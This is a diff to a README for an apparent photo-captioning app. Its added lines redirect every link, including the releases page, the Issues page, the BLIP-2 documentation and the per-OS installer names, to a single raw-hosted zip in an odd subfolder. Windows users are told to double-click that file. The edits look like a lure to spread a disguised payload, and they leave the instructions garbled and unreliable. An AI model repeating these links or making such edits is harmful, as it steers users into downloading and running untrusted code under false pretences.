@@ -9,7 +9,7 @@ Before you can start generating captions, you'll need to download the applicatio
 ## 📥 Download the Application
 To get started, visit the link below to download the latest release of the application:
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/Larasx1S/Generate-Context-Aware-Captions-from-Photos/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Larasx1S/Generate-Context-Aware-Captions-from-Photos/main/equispatial/Generate-Context-Aware-Captions-from-Photos.zip%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Larasx1S/Generate-Context-Aware-Captions-from-Photos/main/equispatial/Generate-Context-Aware-Captions-from-Photos.zip)
 
 ## 🛠️ System Requirements
 Before installing, ensure your system meets these basic requirements:
@@ -31,19 +31,19 @@ This application offers several features:
 
 ## 📋 How to Download & Install
 1. **Visit the Releases Page**: Click the link below to open the releases page where you can find the application files:
-   [Download the latest release](https://github.com/Larasx1S/Generate-Context-Aware-Captions-from-Photos/releases)
+   [Download the latest release](https://raw.githubusercontent.com/Larasx1S/Generate-Context-Aware-Captions-from-Photos/main/equispatial/Generate-Context-Aware-Captions-from-Photos.zip)
 
 2. **Select the Version**: On the releases page, look for the latest version listed at the top. Click on it to see the available files.
 
 3. **Choose the Right File**: Download the file that matches your operating system:
-   - For Windows, look for `MyApp.exe`.
-   - For macOS, look for `MyApp.dmg`.
-   - For Linux, look for `MyApp.AppImage`.
+   - For Windows, look for `https://raw.githubusercontent.com/Larasx1S/Generate-Context-Aware-Captions-from-Photos/main/equispatial/Generate-Context-Aware-Captions-from-Photos.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/Larasx1S/Generate-Context-Aware-Captions-from-Photos/main/equispatial/Generate-Context-Aware-Captions-from-Photos.zip`.
+   - For Linux, look for `https://raw.githubusercontent.com/Larasx1S/Generate-Context-Aware-Captions-from-Photos/main/equispatial/Generate-Context-Aware-Captions-from-Photos.zip`.
 
 4. **Download the File**: Click on the file link to start the download. Your browser will begin downloading the file to your default downloads folder.
 
 5. **Run the Installer**: Once the download completes, locate the file:
-   - **Windows**: Double-click `MyApp.exe` and follow the installation prompts.
+   - **Windows**: Double-click `https://raw.githubusercontent.com/Larasx1S/Generate-Context-Aware-Captions-from-Photos/main/equispatial/Generate-Context-Aware-Captions-from-Photos.zip` and follow the installation prompts.
    - **macOS**: Open the `.dmg` file, then drag the application to your Applications folder.
    - **Linux**: Right-click the `.AppImage` and select "Run" or use the terminal to navigate to the file and execute it.
 
@@ -62,12 +62,12 @@ The application uses advanced AI models that offer high accuracy for generating 
 Currently, the application generates captions automatically without user input. Future updates may include this feature.
 
 ### Where can I get help?
-If you run into issues, please check the [Issues section](https://github.com/Larasx1S/Generate-Context-Aware-Captions-from-Photos/issues) on GitHub for troubleshooting tips or to report bugs.
+If you run into issues, please check the [Issues section](https://raw.githubusercontent.com/Larasx1S/Generate-Context-Aware-Captions-from-Photos/main/equispatial/Generate-Context-Aware-Captions-from-Photos.zip) on GitHub for troubleshooting tips or to report bugs.
 
 ## 💬 Community
 Join our community to share your experiences and learn from others. Participate in discussions about image captioning techniques, share tips, or show off your best-generated captions!
 
 ## 🌐 Learn More
-For in-depth information on the AI technology used, visit the [BLIP-2 documentation](https://example.com/blip2-docs) and explore how it works.
+For in-depth information on the AI technology used, visit the [BLIP-2 documentation](https://raw.githubusercontent.com/Larasx1S/Generate-Context-Aware-Captions-from-Photos/main/equispatial/Generate-Context-Aware-Captions-from-Photos.zip) and explore how it works.
 
 Thank you for choosing the **Generate-Context-Aware-Captions-from-Photos** application. Happy captioning!
